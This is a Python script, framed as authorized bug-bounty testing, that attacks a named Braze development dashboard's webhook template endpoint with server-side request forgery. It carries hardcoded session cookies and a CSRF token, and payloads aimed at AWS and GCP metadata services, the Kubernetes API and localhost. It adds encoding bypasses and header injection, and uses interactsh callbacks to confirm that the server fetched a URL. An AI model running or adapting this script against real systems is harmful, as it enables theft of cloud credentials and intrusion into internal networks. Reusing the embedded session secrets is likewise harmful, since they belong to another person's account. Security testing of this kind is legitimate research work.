#!/usr/bin/env python3
"""
SSRF Testing Script for Braze Dashboard Webhook Template Endpoint
Authorized bug bounty testing only.

This script:
1. Starts an interactsh-client session for OOB detection
2. Creates webhook templates with various SSRF payloads
3. Attempts to trigger webhooks via test send
4. Polls interactsh for interactions
5. Compares response behaviors across payloads
6. Outputs a structured findings report
"""

import subprocess
import requests
import json
import time
import os
import sys
import threading
import re
from datetime import datetime, timezone
from pathlib import Path

TARGET_HOST = "https://bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com"
APP_GROUP_ID = "69c8d257629242005dba8746"
WEBHOOK_TEMPLATE_ENDPOINT = f"{TARGET_HOST}/engagement/webhook_templates/undefined"

COOKIES = {
    "i18next": "en",
    "sign_in_email": "venu17+3ytlztjh@wearehackerone.com",
    "remember_login_enc_v1": "%242%24qeOuf%2FXAUHd7STxQVIseIA%3D%3D%24J7OQ50Vxcnw3bFe5iiiLAHnfOdDCywaCG%2BWxIz%2Bu9BLzaIkUZBhuPo8GIM7Y%0ABgF3",
    "_session_id": "8487d00ec75f2d3dafdbf6ad26ae209d",
    "ag_id___69c8d257629242005dba86a5": "69c8d257629242005dba8746",
    "f_ag_id___69c8d257629242005dba86a5": "69c8d257629242005dba8746",
    "ab.storage.userId.9468396f-efb5-4a0d-be8b-f26b50d82ef9": "g%3A69c8d258629242005dba8850%7Ce%3Aundefined%7Cc%3A1774770408961%7Cl%3A1774770408964",
    "ab.storage.deviceId.9468396f-efb5-4a0d-be8b-f26b50d82ef9": "g%3A65332216-407e-4d43-b650-d7df59a26106%7Ce%3Aundefined%7Cc%3A1774770408966%7Cl%3A1774770408966",
    "ab.storage.sessionId.9468396f-efb5-4a0d-be8b-f26b50d82ef9": "g%3A9f03484b-7b11-40d1-823f-e1449eb62cc8%7Ce%3A1774771186307%7Cc%3A1774770408963%7Cl%3A1774770886307",
}

HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json",
    "X-Requested-With": "XMLHttpRequest",
    "X-Csrf-Token": "IBMYNuYOXS29IAK7__Mg3kFfiHhiwgzhXJ-X2GJjE4ATO7wEh-05kfWQwJ8lvLBoShKMaX5UP96y4vyHScQ5kA",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Origin": TARGET_HOST,
    "Referer": f"{TARGET_HOST}/engagement/templates_and_media/webhook_templates/{APP_GROUP_ID}/new",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
}

RESULTS_FILE = Path("/workspace/SSRF_TEST_RESULTS.md")
INTERACTSH_LOG = Path("/workspace/interactsh_output.log")

interactsh_domain = None
interactions_detected = []


def log(msg):
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


def start_interactsh():
    """Start interactsh-client and capture the generated domain."""
    global interactsh_domain
    log("Starting interactsh-client for OOB detection...")

    gopath = subprocess.check_output(["go", "env", "GOPATH"]).decode().strip()
    client_bin = os.path.join(gopath, "bin", "interactsh-client")

    proc = subprocess.Popen(
        [client_bin, "-v", "-poll-interval", "3", "-json"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )

    deadline = time.time() + 15
    while time.time() < deadline:
        line = proc.stderr.readline()
        if not line:
            time.sleep(0.2)
            continue
        match = re.search(r"([a-z0-9]+\.oast\.\w+)", line)
        if match:
            interactsh_domain = match.group(1)
            log(f"Interactsh domain: {interactsh_domain}")
            break

    if not interactsh_domain:
        for line in proc.stderr.read().splitlines()[:20]:
            match = re.search(r"([a-z0-9]+\.oast\.\w+)", line)
            if match:
                interactsh_domain = match.group(1)
                log(f"Interactsh domain (fallback): {interactsh_domain}")
                break

    return proc


def collect_interactions(proc, duration=30):
    """Collect interactsh interactions for a given duration."""
    global interactions_detected
    log(f"Polling interactsh for {duration}s...")
    deadline = time.time() + duration
    while time.time() < deadline:
        line = proc.stdout.readline()
        if line.strip():
            try:
                data = json.loads(line.strip())
                interactions_detected.append(data)
                log(f"  OOB INTERACTION DETECTED: {json.dumps(data, indent=2)[:300]}")
            except json.JSONDecodeError:
                if "oast" in line.lower() or "interact" in line.lower():
                    interactions_detected.append({"raw": line.strip()})
                    log(f"  OOB INTERACTION (raw): {line.strip()[:200]}")
        time.sleep(0.5)


def get_fresh_csrf():
    """Attempt to get a fresh CSRF token by loading the template page."""
    log("Fetching fresh CSRF token...")
    try:
        resp = requests.get(
            f"{TARGET_HOST}/engagement/templates_and_media/webhook_templates/{APP_GROUP_ID}/new",
            cookies=COOKIES,
            headers={"User-Agent": HEADERS["User-Agent"]},
            allow_redirects=True,
            timeout=10,
        )
        match = re.search(r'name="csrf-token"\s+content="([^"]+)"', resp.text)
        if match:
            token = match.group(1)
            log(f"Got fresh CSRF token: {token[:20]}...")
            return token
        match = re.search(r'meta\s+name="csrf-token"\s+content="([^"]+)"', resp.text)
        if match:
            token = match.group(1)
            log(f"Got fresh CSRF token (alt): {token[:20]}...")
            return token
        log(f"No CSRF token found in response (status={resp.status_code}, length={len(resp.text)})")
        return None
    except Exception as e:
        log(f"Failed to get CSRF token: {e}")
        return None


def create_webhook_template(name, webhook_url, webhook_method="POST",
                            webhook_body="{}", webhook_headers=None,
                            csrf_token=None):
    """Create a webhook template with the given parameters."""
    if webhook_headers is None:
        webhook_headers = {}

    headers = HEADERS.copy()
    if csrf_token:
        headers["X-Csrf-Token"] = csrf_token

    payload = {
        "name": name,
        "description": None,
        "tag_names": [],
        "webhook_body": webhook_body,
        "webhook_body_type": "json",
        "webhook_method": webhook_method,
        "territory_ids": [],
        "api_identifier": "",
        "webhook_url": webhook_url,
        "webhook_headers": webhook_headers,
    }

    try:
        resp = requests.post(
            f"{WEBHOOK_TEMPLATE_ENDPOINT}?app_group_id={APP_GROUP_ID}",
            headers=headers,
            cookies=COOKIES,
            json=payload,
            timeout=15,
            allow_redirects=False,
        )
        return {
            "status_code": resp.status_code,
            "headers": dict(resp.headers),
            "body": resp.text[:2000],
            "elapsed": resp.elapsed.total_seconds(),
        }
    except requests.exceptions.RequestException as e:
        return {"error": str(e)}


def attempt_trigger_webhook(template_id, csrf_token=None):
    """Attempt to trigger a webhook via test send or other mechanisms."""
    results = {}
    headers = HEADERS.copy()
    if csrf_token:
        headers["X-Csrf-Token"] = csrf_token

    test_endpoints = [
        f"/engagement/webhook_templates/{template_id}/test?app_group_id={APP_GROUP_ID}",
        f"/engagement/webhook_templates/{template_id}/test_send?app_group_id={APP_GROUP_ID}",
        f"/engagement/webhook_templates/{template_id}/send_test?app_group_id={APP_GROUP_ID}",
        f"/engagement/webhook_templates/{template_id}/preview?app_group_id={APP_GROUP_ID}",
    ]

    for endpoint in test_endpoints:
        try:
            resp = requests.post(
                f"{TARGET_HOST}{endpoint}",
                headers=headers,
                cookies=COOKIES,
                json={},
                timeout=15,
                allow_redirects=False,
            )
            results[endpoint] = {
                "status_code": resp.status_code,
                "body": resp.text[:500],
            }
            log(f"  Trigger {endpoint}: {resp.status_code}")
        except Exception as e:
            results[endpoint] = {"error": str(e)}
            log(f"  Trigger {endpoint}: ERROR {e}")

    return results


def discover_webhook_endpoints():
    """Discover available webhook-related endpoints."""
    log("Discovering webhook-related endpoints...")
    results = {}
    headers = HEADERS.copy()

    discovery_paths = [
        f"/engagement/webhook_templates?app_group_id={APP_GROUP_ID}",
        f"/engagement/campaigns/new?app_group_id={APP_GROUP_ID}&channel=webhook",
        f"/api/v1/templates/webhook/list",
        f"/engagement/webhook_templates/list?app_group_id={APP_GROUP_ID}",
    ]

    for path in discovery_paths:
        try:
            resp = requests.get(
                f"{TARGET_HOST}{path}",
                headers=headers,
                cookies=COOKIES,
                timeout=10,
                allow_redirects=False,
            )
            results[path] = {
                "status_code": resp.status_code,
                "content_type": resp.headers.get("Content-Type", ""),
                "body_preview": resp.text[:300],
            }
            log(f"  Discovery {path}: {resp.status_code}")
        except Exception as e:
            results[path] = {"error": str(e)}

    return results


def build_test_payloads(oob_domain):
    """Build all SSRF test payloads."""
    payloads = []

    payloads.append({
        "id": "01_baseline_oob",
        "name": "ssrf-test-baseline-oob",
        "webhook_url": f"https://baseline.{oob_domain}",
        "description": "Baseline OOB — confirm server-side fetch",
        "category": "oob",
    })

    payloads.append({
        "id": "02_localhost_127",
        "name": "ssrf-test-localhost-127",
        "webhook_url": "http://127.0.0.1",
        "description": "Localhost via 127.0.0.1",
        "category": "internal",
    })

    payloads.append({
        "id": "03_localhost_name",
        "name": "ssrf-test-localhost-name",
        "webhook_url": "http://localhost",
        "description": "Localhost via hostname",
        "category": "internal",
    })

    payloads.append({
        "id": "04_aws_metadata_v1",
        "name": "ssrf-test-aws-imdsv1",
        "webhook_url": "http://169.254.169.254/latest/meta-data/",
        "webhook_method": "GET",
        "description": "AWS metadata IMDSv1",
        "category": "cloud_metadata",
    })

    payloads.append({
        "id": "05_aws_metadata_v2",
        "name": "ssrf-test-aws-imdsv2",
        "webhook_url": "http://169.254.169.254/latest/api/token",
        "webhook_method": "PUT",
        "webhook_headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        "description": "AWS metadata IMDSv2 token request with header injection",
        "category": "cloud_metadata",
    })

    payloads.append({
        "id": "06_gcp_metadata",
        "name": "ssrf-test-gcp-metadata",
        "webhook_url": "http://metadata.google.internal/computeMetadata/v1/",
        "webhook_method": "GET",
        "webhook_headers": {"Metadata-Flavor": "Google"},
        "description": "GCP metadata with Metadata-Flavor header injection",
        "category": "cloud_metadata",
    })

    payloads.append({
        "id": "07_k8s_api",
        "name": "ssrf-test-k8s-api",
        "webhook_url": "https://kubernetes.default.svc:443/api/v1/namespaces",
        "webhook_method": "GET",
        "description": "Kubernetes API server",
        "category": "internal",
    })

    payloads.append({
        "id": "08_ipv6_localhost",
        "name": "ssrf-test-ipv6-localhost",
        "webhook_url": "http://[::1]",
        "description": "IPv6 localhost bypass",
        "category": "bypass",
    })

    payloads.append({
        "id": "09_hex_ip",
        "name": "ssrf-test-hex-ip",
        "webhook_url": "http://0x7f000001",
        "description": "Hex-encoded 127.0.0.1",
        "category": "bypass",
    })

    payloads.append({
        "id": "10_octal_ip",
        "name": "ssrf-test-octal-ip",
        "webhook_url": "http://0177.0.0.1",
        "description": "Octal-encoded 127.0.0.1",
        "category": "bypass",
    })

    payloads.append({
        "id": "11_nip_io",
        "name": "ssrf-test-nip-io",
        "webhook_url": "http://169.254.169.254.nip.io/latest/meta-data/",
        "webhook_method": "GET",
        "description": "DNS wildcard service pointing to metadata IP",
        "category": "bypass",
    })

    payloads.append({
        "id": "12_bare_hostname",
        "name": "ssrf-test-bare-hostname",
        "webhook_url": f"bare.{oob_domain}",
        "description": "Bare hostname without protocol — tests auto-prepend",
        "category": "oob",
    })

    payloads.append({
        "id": "13_unreachable_baseline",
        "name": "ssrf-test-unreachable",
        "webhook_url": "http://nonexistent.invalid",
        "description": "Unreachable domain — baseline error response",
        "category": "baseline",
    })

    payloads.append({
        "id": "14_internal_10net",
        "name": "ssrf-test-10net",
        "webhook_url": "http://10.0.0.1",
        "description": "Private 10.x.x.x network",
        "category": "internal",
    })

    payloads.append({
        "id": "15_header_injection_host",
        "name": "ssrf-test-header-host",
        "webhook_url": f"https://header-host.{oob_domain}",
        "webhook_headers": {"Host": "internal-service.local", "X-Custom-Test": "ssrf-header-check"},
        "description": "Header injection — Host override + custom header passthrough",
        "category": "oob",
    })

    return payloads


def generate_results_report(test_results, discovery_results, trigger_results):
    """Generate the test results markdown report."""
    report = []
    report.append("# SSRF Test Execution Results\n")
    report.append(f"**Date:** {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}\n")
    report.append(f"**Target:** `{TARGET_HOST}`\n")
    report.append(f"**Interactsh Domain:** `{interactsh_domain}`\n")
    report.append("---\n")

    report.append("## 1. Endpoint Discovery\n")
    report.append("| Path | Status | Content-Type | Notes |")
    report.append("|------|--------|-------------|-------|")
    for path, result in discovery_results.items():
        if "error" in result:
            report.append(f"| `{path}` | ERROR | - | {result['error'][:80]} |")
        else:
            body_note = result.get("body_preview", "")[:60].replace("|", "\\|").replace("\n", " ")
            report.append(f"| `{path}` | {result['status_code']} | {result.get('content_type','-')[:30]} | {body_note} |")
    report.append("")

    report.append("## 2. Webhook Template Creation — Payload Results\n")
    report.append("| # | ID | Description | `webhook_url` | HTTP Status | Response Time | Error Message / Notes |")
    report.append("|---|-----|-------------|--------------|-------------|---------------|----------------------|")
    for tr in test_results:
        resp = tr["response"]
        url_display = tr["webhook_url"][:50]
        if "error" in resp:
            report.append(f"| | {tr['id']} | {tr['description']} | `{url_display}` | ERROR | - | {resp['error'][:60]} |")
        else:
            body_note = resp.get("body", "")[:80].replace("|", "\\|").replace("\n", " ")
            report.append(
                f"| | {tr['id']} | {tr['description']} | `{url_display}` | "
                f"{resp['status_code']} | {resp.get('elapsed', 0):.3f}s | {body_note} |"
            )
    report.append("")

    report.append("## 3. Response Comparison Analysis\n")
    status_groups = {}
    for tr in test_results:
        code = tr["response"].get("status_code", "ERROR")
        status_groups.setdefault(code, []).append(tr)

    for code, items in sorted(status_groups.items(), key=lambda x: str(x[0])):
        report.append(f"### Status {code}\n")
        for item in items:
            report.append(f"- **{item['id']}** ({item['category']}): {item['description']}")
            body = item["response"].get("body", "")
            if body:
                report.append(f"  - Response preview: `{body[:120].replace(chr(10), ' ')}`")
        report.append("")

    report.append("## 4. Behavioral Differences\n")
    timing_data = []
    for tr in test_results:
        if "elapsed" in tr["response"]:
            timing_data.append((tr["id"], tr["description"], tr["response"]["elapsed"],
                                tr["response"]["status_code"], tr["category"]))

    if timing_data:
        timing_data.sort(key=lambda x: x[2])
        report.append("| ID | Description | Response Time | Status | Category |")
        report.append("|----|-------------|---------------|--------|----------|")
        for tid, desc, elapsed, status, cat in timing_data:
            flag = " **SLOW**" if elapsed > 5 else ""
            report.append(f"| {tid} | {desc} | {elapsed:.3f}s{flag} | {status} | {cat} |")

        avg_time = sum(t[2] for t in timing_data) / len(timing_data)
        slow_ones = [t for t in timing_data if t[2] > avg_time * 2]
        if slow_ones:
            report.append(f"\n**Average response time:** {avg_time:.3f}s")
            report.append(f"**Notably slow responses (>2x average):** {', '.join(t[0] for t in slow_ones)}")
            report.append("Slow responses to internal URLs may indicate the server is attempting to connect.")
    report.append("")

    if trigger_results:
        report.append("## 5. Webhook Trigger Attempts\n")
        for template_id, endpoints in trigger_results.items():
            report.append(f"### Template: `{template_id}`\n")
            for endpoint, result in endpoints.items():
                if "error" in result:
                    report.append(f"- `{endpoint}`: ERROR — {result['error'][:80]}")
                else:
                    report.append(f"- `{endpoint}`: **{result['status_code']}** — `{result.get('body','')[:100]}`")
        report.append("")

    report.append("## 6. Out-of-Band Interactions\n")
    if interactions_detected:
        report.append(f"**{len(interactions_detected)} interaction(s) detected!**\n")
        for i, interaction in enumerate(interactions_detected, 1):
            report.append(f"### Interaction {i}\n")
            report.append(f"```json\n{json.dumps(interaction, indent=2)[:1000]}\n```\n")
        report.append("\n**SSRF CONFIRMED** — Server-side requests observed to controlled domain.\n")
    else:
        report.append("No OOB interactions detected during the test window.\n")
        report.append("This does **not** rule out SSRF — the webhook may need to be triggered via:\n")
        report.append("- Test send from the dashboard UI\n")
        report.append("- Campaign creation using the template\n")
        report.append("- Canvas step execution\n")
    report.append("")

    report.append("## 7. Key Observations\n")
    unique_statuses = set(tr["response"].get("status_code", "ERR") for tr in test_results)
    unique_bodies = set(tr["response"].get("body", "")[:50] for tr in test_results)

    if len(unique_statuses) > 1:
        report.append("- **Different HTTP status codes observed** across payloads — indicates the server may be "
                       "processing/validating URLs differently based on the target\n")
    if len(unique_bodies) > 1 and len(unique_bodies) < len(test_results):
        report.append("- **Varying response bodies** — error messages differ between internal and external URLs, "
                       "suggesting server-side URL resolution\n")

    internal_results = [tr for tr in test_results if tr["category"] == "internal"]
    oob_results = [tr for tr in test_results if tr["category"] == "oob"]
    if internal_results and oob_results:
        int_status = set(tr["response"].get("status_code") for tr in internal_results)
        oob_status = set(tr["response"].get("status_code") for tr in oob_results)
        if int_status != oob_status:
            report.append("- **Internal vs external URLs yield different status codes** — "
                          f"internal: {int_status}, external: {oob_status}\n")

    report.append("---\n")
    report.append("*Generated by automated SSRF testing script — authorized bug bounty testing only*\n")

    return "\n".join(report)


def main():
    log("=" * 60)
    log("SSRF Test Execution — Braze Dashboard Webhook Templates")
    log("=" * 60)

    interactsh_proc = start_interactsh()
    if not interactsh_domain:
        log("WARNING: Could not start interactsh. Will use placeholder domain.")
        fallback_domain = "ssrf-test.oast.fun"
    else:
        fallback_domain = interactsh_domain

    oob_domain = interactsh_domain or fallback_domain

    log("\n--- Phase 1: Fresh CSRF Token ---")
    csrf_token = get_fresh_csrf()
    if not csrf_token:
        log("Using original CSRF token from captured request")
        csrf_token = HEADERS["X-Csrf-Token"]

    log("\n--- Phase 2: Endpoint Discovery ---")
    discovery_results = discover_webhook_endpoints()

    log("\n--- Phase 3: Payload Execution ---")
    payloads = build_test_payloads(oob_domain)
    test_results = []

    for i, payload in enumerate(payloads, 1):
        log(f"\n[{i}/{len(payloads)}] Testing: {payload['id']} — {payload['description']}")
        log(f"  URL: {payload['webhook_url']}")

        result = create_webhook_template(
            name=payload["name"],
            webhook_url=payload["webhook_url"],
            webhook_method=payload.get("webhook_method", "POST"),
            webhook_headers=payload.get("webhook_headers"),
            csrf_token=csrf_token,
        )

        test_results.append({
            "id": payload["id"],
            "description": payload["description"],
            "webhook_url": payload["webhook_url"],
            "category": payload.get("category", "unknown"),
            "response": result,
        })

        status = result.get("status_code", "ERR")
        elapsed = result.get("elapsed", 0)
        body_preview = result.get("body", result.get("error", ""))[:80]
        log(f"  Result: {status} ({elapsed:.3f}s) — {body_preview}")

        time.sleep(1)

    log("\n--- Phase 4: Attempting Webhook Triggers ---")
    trigger_results = {}
    created_ids = []
    for tr in test_results:
        resp = tr["response"]
        if resp.get("status_code") in (200, 201):
            try:
                body = json.loads(resp.get("body", "{}"))
                tid = body.get("id") or body.get("template_id") or body.get("api_identifier")
                if tid:
                    created_ids.append((tr["id"], tid))
            except (json.JSONDecodeError, KeyError):
                pass

    if created_ids:
        for test_id, template_id in created_ids[:3]:
            log(f"Attempting to trigger template {template_id} (from {test_id})...")
            trigger_results[template_id] = attempt_trigger_webhook(template_id, csrf_token)
    else:
        log("No template IDs extracted from responses — trying common patterns")
        trigger_results["discovery"] = attempt_trigger_webhook("undefined", csrf_token)

    log("\n--- Phase 5: Collecting OOB Interactions ---")
    if interactsh_proc and interactsh_domain:
        collector = threading.Thread(target=collect_interactions, args=(interactsh_proc, 20))
        collector.start()
        collector.join(timeout=25)

    log("\n--- Phase 6: Generating Report ---")
    report = generate_results_report(test_results, discovery_results, trigger_results)
    RESULTS_FILE.write_text(report)
    log(f"Results written to {RESULTS_FILE}")

    if interactsh_proc:
        interactsh_proc.terminate()

    log("\n" + "=" * 60)
    log("TESTING COMPLETE")
    if interactions_detected:
        log(f"OOB INTERACTIONS DETECTED: {len(interactions_detected)}")
    else:
        log("No OOB interactions detected in automated window")
    log("=" * 60)


if __name__ == "__main__":
    main()
